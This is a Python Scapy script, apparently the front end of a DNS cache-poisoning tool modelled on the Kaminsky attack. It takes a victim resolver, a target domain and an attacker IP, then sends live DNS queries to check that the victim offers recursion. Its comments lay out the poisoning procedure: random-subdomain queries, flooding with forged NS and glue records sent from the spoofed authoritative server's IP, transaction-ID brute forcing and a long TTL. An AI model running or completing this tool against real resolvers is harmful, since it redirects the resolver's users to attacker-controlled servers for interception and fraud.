from scapy.all import IP, UDP, DNS, DNSQR, DNSRR, sr1, sr
import sys
# input processing
import argparse
# colors
from vars import ccolors
# custom modules
from kaminskySilent import silent as silent
from kaminskyLoud import loud as loud
from getsoa import getSoaForDomain
from validinp import validateInput
import utils

# collect command line input
parser = argparse.ArgumentParser(description='Kaminsky DNS', prog='kaminsky')
posArgs = parser.add_argument_group('PositionalArgs', 'Positional Arguments')
posArgs.add_argument('victim', nargs='?', help='Victim DNS server (provide IP)', metavar='victimIP')
posArgs.add_argument('targetDomain', nargs='?', help='Target domain that is to be poisoned in the cache (provide URL)', metavar='targetDomain')
posArgs.add_argument('addressToForge', nargs='?', help='Server to be spoofed as target domain\'s authoritate DNS server (provide IP)', metavar='yourDNSIP')
parser.add_argument('-t', '--ttl', dest='ttl', type=int, action='store', const=300, default=300, nargs='?', help='Time To Live to be injected into the record in victim\'s cache')
# -s (--silent) and -l (--loud) cannot be put together
exclGroup = parser.add_mutually_exclusive_group();
exclGroup.add_argument('-s', '--silent', dest='silent', action='store_true', default='False')
exclGroup.add_argument('-l', '--loud', dest='silent', action='store_false')

args = parser.parse_args()

# validate input
if not validateInput(args):
    print "incorrect input format"
    sys.exit()

# get the start of authority (SOA) record for target domain and glue IP
getSoaForDomain(args)

# check whether the supplied DNS server is authoritative and whether it supports reccursion
# if not print and terminate (authoritative nameservers give the RR imidiately without search so they cannot be poisoned, recursion has to be supported)
if args.victim in args.soaIP:
    print ccolors.WARNING + 'Selected DNS server is authoritative for the supplied domain. You cannot cache poison an authoritative nameserver with this tool!\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC
    sys.exit()
ans = sr1(IP(dst=args.victim) / UDP(sport=utils.getRandomPort()) / DNS(rd=1, qd=DNSQR(qname='google.com')), timeout=10) # wait for up to 10 seconds for response
if ans == None:
    print ccolors.WARNING + 'Supplied victim IP does not answer to DNS queries. Check IP and try again.\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC
    sys.exit()
if ans[DNS].ra == 0:
    print ccolors.WARNING + 'Supplied victim nameserver does not offer recursion, therefore cannot be cache poisoned with this tool.\n' + ccolors.FAIL + 'Terminating...' + ccolors.NC
    sys.exit()

# print the starting message and start
out = '\nVictim DNS: ' + args.victim + '\nTarget domain: ' + args.targetDomain + '\nSpoofing IP: ' + args.addressToForge + '\nMethod: '
if args.silent:
    print (out + 'silent')
else:
    print (out + 'loud')
print '\nStarting sequence\n'

# if args.silent:
#     silent(args)
# else:
#     loud(args)

# loop:
# send the query with the target domain to the victim (generate random subdomain, i.e. 1234www5678.example.com)

# after this the victim will start asking other DNS servers (after first try others will be cached so the victim will only ask the authoritative server) for the IP
# flood the victim with the forged query answers including the addressToForge
# each of the packets should contain an NS and an A record: NS record - targetDomain NS args.soaDomain ; A record - args.soaDomain A addressToForge ; at the same time the authoritative server will be sending the same A record but instead of addressToForge he will put his IP (args.soaIP)
# try as many TXID combinations as possible (maybe implement calculation of toplogical distance to calculate the number of queries) and set TTL to a very high value
# make sure to set the source IP to args.soaIP

# in case the last step fails (no cache poisoning) redo the loop
# there needs to be a step here to check whether the cache poisoning worked (send a query to the vicitim DNS server and check the answer)
